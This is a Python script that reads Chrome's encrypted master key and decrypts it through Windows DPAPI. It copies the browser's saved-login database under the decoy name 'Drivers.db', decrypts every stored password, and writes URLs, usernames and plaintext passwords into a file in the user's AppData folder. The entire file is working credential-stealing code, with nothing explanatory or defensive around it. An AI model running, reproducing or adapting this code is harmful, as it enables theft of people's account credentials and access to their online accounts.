# -*- coding: utf-8 -*-
"""
Created on Wed Jun  9 01:12:37 2021

@author: Musya
"""
import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import datetime, timedelta

def chrome_date_and_time(chrome_data):
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)

def fetching_encryption_key():
    local_computer_directory_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", 
      "User Data", "Local State")
      
    with open(local_computer_directory_path, "r", encoding="utf-8") as f:
        local_state_data = f.read()
        local_state_data = json.loads(local_state_data)

    encryption_key = base64.b64decode(
      local_state_data["os_crypt"]["encrypted_key"])
      
    # remove Windows Data Protection API (DPAPI) str
    encryption_key = encryption_key[5:]
      
    # return decrypted key
    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
  
def password_decryption(password, encryption_key):
    try:
        iv = password[3:15]
        password = password[15:]
          
        # generate cipher
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
          
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
          
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "No Passwords"

def main():

    key = fetching_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "Drivers.db"
    shutil.copyfile(db_path, filename)
    
    # connecting to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
      
    # 'logins' table has the data
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
        "order by date_last_used")
      
    # iterate over all rows

    for row in cursor.fetchall():
        main_url = row[0]
        login_page_url = row[1]
        user_name = row[2]
        decrypted_password = password_decryption(row[3], key)
        date_of_creation = row[4]
        last_usuage = row[5]
        
        path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local")
        name = "File.txt"
        f_name = os.path.join(path,name)
        
        with open(f_name, "a") as f:
            data = ["\n",
                    "Main URL: ",   str(main_url),          "\n", 
                    "Login URL: ",  str(login_page_url),     "\n",
                    "Username: ",   str(user_name),           "\n",
                    "Password: ",   str(decrypted_password),  "\n",
                    "Date of Creation: ", str(chrome_date_and_time(date_of_creation)),  "\n",
                    "Last Usage(Date) ",  str(chrome_date_and_time(last_usuage))   ,"\n"
                    ] 
            f.write("*" * 100)
            f.writelines(data)
          
    cursor.close()
    db.close()
    os.remove(filename)  
    return f_name

  
if __name__ == "__main__":
    f_name = main()